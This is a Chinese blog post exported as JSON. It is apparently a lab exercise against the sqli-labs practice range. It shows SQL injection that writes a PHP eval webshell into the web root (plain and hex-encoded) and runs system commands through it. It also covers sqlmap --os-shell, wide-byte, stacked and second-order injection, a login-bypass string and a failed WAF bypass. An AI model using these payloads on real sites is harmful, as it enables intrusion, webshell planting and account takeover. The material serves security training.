{"title":"day09-test","uid":"521513d1964f32727f98c554936ae859","slug":"day09-test","date":"2025-08-21T10:43:36.000Z","updated":"2025-09-02T07:47:06.441Z","comments":true,"path":"api/articles/day09-test.json","keywords":null,"cover":[],"content":"<h2 id=\"1、使用手工注入的方式写入一句话木马\"><a href=\"#1、使用手工注入的方式写入一句话木马\" class=\"headerlink\" title=\"1、使用手工注入的方式写入一句话木马\"></a>1、使用手工注入的方式写入一句话木马</h2><p>一般来说，MySQL不允许文件的写入，想要执行写入一句话木马的效果，需要修改配置文件my.ini，在后面加上<code>secure_file_priv=</code>，重启pupstudy，这样就能进行文件的读写操作</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821190116221.png\" alt=\"image-20250821190116221\"></p>\n<p>打开终端，进入MySQL数据库，输入命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select &quot;123&quot; into outfile &#x27;D:/phpStudy/WWW/1.txt&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821190356427.png\" alt=\"image-20250821190356427\"></p>\n<p>可以看到成功执行，并且在路径下多出了一个 1.txt 文件，文件内容正是123</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821190445352.png\" alt=\"image-20250821190445352\"></p>\n<p>这样就导致攻击者可以直接写入一句话木马进入Web目录下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=111&#x27; union select 1,&lt;?php @eval($_POST[&#x27;x&#x27;]); ?&gt;,3 into outfile &#x27;D:/phpStudy/WWW/11.php&#x27; --+</span><br></pre></td></tr></table></figure>\n\n<p>直接这样执行，会报错</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821191642279.png\" alt=\"image-20250821191642279\"></p>\n<p>这是由于可能的单引号冲突或者字符转义问题，将<code>&lt;?php @eval($_POST[&#39;x&#39;]); ?&gt;</code>修改为十六进制<code>0x3c3f70687020406576616c28245f4745545b2778275d293b203f3e</code>再次执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821191830741.png\" alt=\"image-20250821191830741\"></p>\n<p>成功执行并且目录下方多了一个11.php的一句话木马，现在直接去使用这个木马，传入参数<code>?x=system(ipconfig);</code>，得到敏感信息</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821192052182.png\" alt=\"image-20250821192052182\"></p>\n<h2 id=\"2、使用一下sqlmap工具的–os-shell选项\"><a href=\"#2、使用一下sqlmap工具的–os-shell选项\" class=\"headerlink\" title=\"2、使用一下sqlmap工具的–os-shell选项\"></a>2、使用一下sqlmap工具的–os-shell选项</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u <span class=\"string\">&quot;http://192.168.232.148/sqli-labs-master/Less-1/?id=1&quot;</span> --os-shell --web-root=<span class=\"string\">&quot;D:/phpStudy/WWW&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>在使用sqlmap时可能会报错，这可能是路径问题，指定Web路径就可以了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821194310778.png\" alt=\"image-20250821194310778\"></p>\n<h2 id=\"3、使用sqlmap工具查看security数据库users表的所有字段\"><a href=\"#3、使用sqlmap工具查看security数据库users表的所有字段\" class=\"headerlink\" title=\"3、使用sqlmap工具查看security数据库users表的所有字段\"></a>3、使用sqlmap工具查看security数据库users表的所有字段</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u <span class=\"string\">&quot;http://192.168.232.148/sqli-labs-master/Less-1/?id=1&quot;</span> -D security -T <span class=\"built_in\">users</span> --columns --batch</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821194945910.png\" alt=\"image-20250821194945910\"></p>\n<h2 id=\"4、演示宽字节注入，堆叠注入，二次注入，万能密码，解释相关原理\"><a href=\"#4、演示宽字节注入，堆叠注入，二次注入，万能密码，解释相关原理\" class=\"headerlink\" title=\"4、演示宽字节注入，堆叠注入，二次注入，万能密码，解释相关原理\"></a>4、演示宽字节注入，堆叠注入，二次注入，万能密码，解释相关原理</h2><h3 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h3><p>利用 MySQL 使用 GBK 编码（因为 GBK 占用2个字节，而ASCII占用1个字节），将两个字符看作一个汉字，从而消除转义字符 \\ 。（当某字符的大小为一个字节时，称其字符为窄字节当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节。）</p>\n<p>从源码分析</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_addslashes</span>(<span class=\"params\"><span class=\"variable\">$string</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$string</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/&#x27;</span>. <span class=\"title function_ invoke__\">preg_quote</span>(<span class=\"string\">&#x27;\\\\&#x27;</span>) .<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"string\">&quot;\\\\\\\\\\\\&quot;</span>, <span class=\"variable\">$string</span>);          <span class=\"comment\">//escape any backslash</span></span><br><span class=\"line\">    <span class=\"variable\">$string</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/\\&#x27;/i&#x27;</span>, <span class=\"string\">&#x27;\\\\\\&#x27;&#x27;</span>, <span class=\"variable\">$string</span>);                               <span class=\"comment\">//escape single quote with a backslash</span></span><br><span class=\"line\">    <span class=\"variable\">$string</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/\\&quot;/&#x27;</span>, <span class=\"string\">&quot;\\\\\\&quot;&quot;</span>, <span class=\"variable\">$string</span>);                                <span class=\"comment\">//escape double quote with a backslash</span></span><br><span class=\"line\">      </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$string</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 1. 转义反斜杠：\\ → \\\\</span></span><br><span class=\"line\"><span class=\"variable\">$string</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/&#x27;</span>. <span class=\"title function_ invoke__\">preg_quote</span>(<span class=\"string\">&#x27;\\\\&#x27;</span>) .<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"string\">&quot;\\\\\\\\\\\\&quot;</span>, <span class=\"variable\">$string</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 2. 转义单引号：&#x27; → \\&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$string</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/\\&#x27;/i&#x27;</span>, <span class=\"string\">&#x27;\\\\\\&#x27;&#x27;</span>, <span class=\"variable\">$string</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">// 3. 转义双引号：&quot; → \\&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$string</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/\\&quot;/&#x27;</span>, <span class=\"string\">&quot;\\\\\\&quot;&quot;</span>, <span class=\"variable\">$string</span>);</span><br></pre></td></tr></table></figure>\n\n<p>在<code>%5c%27</code>前面添加<code>%df</code>，形成<code>%df%5c%27</code>，而上面提到的 MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，此时<code>%df%5c</code>就是一个汉字，<code>%27</code>则作为一个单独的符号在外面</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821201252171.png\" alt=\"image-20250821201252171\"></p>\n<p>在输入<code>?id=111&#39; union select 1,2,3 --+</code>后，数据库接收到<code>&#39;</code>，自动在前面添加转义符号<code>\\</code>，导致无法正常注入</p>\n<p>只要在输入时，在<code>&#39;</code>前面添加<code>%df</code>，这样<code>%df</code>与<code>\\</code>也就是<code>%5c</code>形成<code>%df%5c</code>组成汉字，从而让<code>&#39;</code>逃逸，能够执行注入</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821201727306.png\" alt=\"image-20250821201727306\"></p>\n<h3 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h3><p>堆叠注入的核心在于通过分号<code>;</code>分隔执行多条 SQL 语句，攻击者通过注入多个 SQL 语句到一个查询中，利用数据库支持堆叠查询的特性（即在同一条查询中执行多个 SQL 语句）来执行恶意操作。</p>\n<p>这是原先的数据库</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821202935222.png\" alt=\"image-20250821202935222\"></p>\n<p>输入命令，进行堆叠注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27;;insert into users(id,username,password) values (&#x27;38&#x27;,&#x27;ninihaihai&#x27;,&#x27;majorno1&#x27;) --+</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821202912361.png\" alt=\"image-20250821202912361\"></p>\n<p>这是注入后数据库</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821203032584.png\" alt=\"image-20250821203032584\"></p>\n<p>可以看到成功添加用户<code>ninihaihai</code> 密码<code>majorno1</code></p>\n<h3 id=\"二次注入\"><a href=\"#二次注入\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h3><p>攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。</p>\n<p>先注册用户<code>admin‘#</code>密码随便</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821204029935.png\" alt=\"image-20250821204029935\"></p>\n<p>可以在数据库中查询到刚刚创建的用户</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821204102944.png\" alt=\"image-20250821204102944\"></p>\n<p>登录刚刚创建的用户，并修改密码123456为111111</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821204249811.png\" alt=\"image-20250821204249811\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821204312511.png\" alt=\"image-20250821204312511\"></p>\n<p>这个时候再次查询数据库</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821204347676.png\" alt=\"image-20250821204347676\"></p>\n<p>发现<code>admin’#</code>的密码没有发生变化，反而是<code>admin</code>的密码变成了111111，这是由于原先我们创建的用户<code>admin’#</code>，在执行修改密码的 SQL 语句时，由于用户名中存在<code>‘#</code>，导致语句在执行时把<code>’</code>当作闭合，然后<code>#</code>后面全部注释掉了，这就导致将<code>admin</code>的密码给修改了。</p>\n<h3 id=\"万能密码\"><a href=\"#万能密码\" class=\"headerlink\" title=\"万能密码\"></a>万能密码</h3><p>输入用户名和错误密码，登录失败</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821205202273.png\" alt=\"image-20250821205202273\"></p>\n<p>在用户名输入万能密码<code>admin&#39;or&#39;1&#39;=&#39;1#</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821205300281.png\" alt=\"image-20250821205300281\"></p>\n<p>登录成功，并显示用户名密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821205335766.png\" alt=\"image-20250821205335766\"></p>\n<p>这是因为当我们提交<code>username</code>和<code>password</code>后，后台形成的 SQL 语句为<code>@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;admin&#39;or&#39;1&#39;=&#39;1# password=&#39;$passwd&#39; LIMIT 0,1&quot;;</code>在<code>#</code>以后的内容就被注释掉，前面的内容因为<code>or1=1</code>恒成立，所以语句就成立，我们此时以<code>admin</code>的用户登录。</p>\n<h2 id=\"5、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称\"><a href=\"#5、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称\" class=\"headerlink\" title=\"5、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称\"></a>5、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称</h2><p>当部署安全狗之后，简单的注入无法完成</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821210205478.png\" alt=\"image-20250821210205478\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821214607661.png\" alt=\"image-20250821214607661\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250821215122436.png\" alt=\"image-20250821215122436\"></p>\n<p>多种尝试，未绕过waf</p>\n","text":"1、使用手工注入的方式写入一句话木马一般来说，MySQL不允许文件的写入，想要执行写入一句话木马的效果，需要修改配置文件my.ini，在后面加上secure_f...","permalink":"/post/day09-test","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[],"tags":[{"name":"练习","slug":"练习","count":14,"path":"api/tags/练习.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1%E3%80%81%E4%BD%BF%E7%94%A8%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E7%9A%84%E6%96%B9%E5%BC%8F%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC\"><span class=\"toc-text\">1、使用手工注入的方式写入一句话木马</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2%E3%80%81%E4%BD%BF%E7%94%A8%E4%B8%80%E4%B8%8Bsqlmap%E5%B7%A5%E5%85%B7%E7%9A%84%E2%80%93os-shell%E9%80%89%E9%A1%B9\"><span class=\"toc-text\">2、使用一下sqlmap工具的–os-shell选项</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3%E3%80%81%E4%BD%BF%E7%94%A8sqlmap%E5%B7%A5%E5%85%B7%E6%9F%A5%E7%9C%8Bsecurity%E6%95%B0%E6%8D%AE%E5%BA%93users%E8%A1%A8%E7%9A%84%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5\"><span class=\"toc-text\">3、使用sqlmap工具查看security数据库users表的所有字段</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4%E3%80%81%E6%BC%94%E7%A4%BA%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%8C%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%8C%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%EF%BC%8C%E8%A7%A3%E9%87%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">4、演示宽字节注入，堆叠注入，二次注入，万能密码，解释相关原理</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">宽字节注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">堆叠注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">二次注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81\"><span class=\"toc-text\">万能密码</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5%E3%80%81%E5%B0%9D%E8%AF%95%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%9A%84%E9%99%90%E5%88%B6%EF%BC%8C%E6%B3%A8%E5%85%A5%E5%87%BA%E6%9D%A5security%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%87%A0%E5%BC%A0%E8%A1%A8%E5%90%8D%E7%A7%B0\"><span class=\"toc-text\">5、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称</span></a></li></ol>","author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"week2-test","uid":"863b4b95d25d05f1547152379537778b","slug":"week2-test","date":"2025-08-22T06:15:43.000Z","updated":"2025-09-02T07:47:56.973Z","comments":true,"path":"api/articles/week2-test.json","keywords":null,"cover":[],"text":"1、参考sqli-lab靶场优化第一周编写的cms，将注册功能，登录功能优化，新增修改密码功能注册功能mysqli_prepare(): 这个函数用于准备一个S...","permalink":"/post/week2-test","photos":[],"count_time":{"symbolsCount":"10k","symbolsTime":"9 mins."},"categories":[],"tags":[{"name":"练习","slug":"练习","count":14,"path":"api/tags/练习.json"}],"author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"SQL注入","uid":"b311e9cfc6ae4c9c01db03a6b6b9c553","slug":"SQL注入","date":"2025-08-21T08:50:08.000Z","updated":"2025-08-21T10:51:52.720Z","comments":true,"path":"api/articles/SQL注入.json","keywords":null,"cover":null,"text":"SQL注入","permalink":"/post/SQL注入","photos":[],"count_time":{"symbolsCount":5,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"Web","slug":"Web","count":5,"path":"api/tags/Web.json"}],"author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}